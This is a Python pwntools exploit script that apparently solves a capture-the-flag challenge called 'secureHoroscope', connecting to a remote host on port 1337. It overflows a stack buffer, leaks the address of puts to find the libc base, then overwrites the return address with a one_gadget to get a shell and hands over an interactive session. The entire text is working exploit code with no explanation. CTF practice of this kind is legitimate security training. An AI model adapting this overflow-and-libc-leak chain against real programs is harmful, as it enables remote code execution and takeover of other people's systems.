from pwn import *

libc = ELF('./libc-2.27.so')
elf = ELF('./secureHoroscope_patched')
# p = elf.process()
p = remote('sechoroscope.sdc.tf', 1337)

pop_rdi = 0x400873

payload = b'a'*112
payload += p64(elf.got.puts + 0x30)
payload += p64(0x40071c)

p.sendline(b'a')
p.recv()
sleep(0.1)
p.sendline(payload)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym.puts
print(hex(libc.address))

one_gadget = libc.address + 0x10a2fc

payload = b'a'*120
payload += p64(one_gadget)

p.sendline(payload)
p.recvrepeat(0.5)

p.interactive()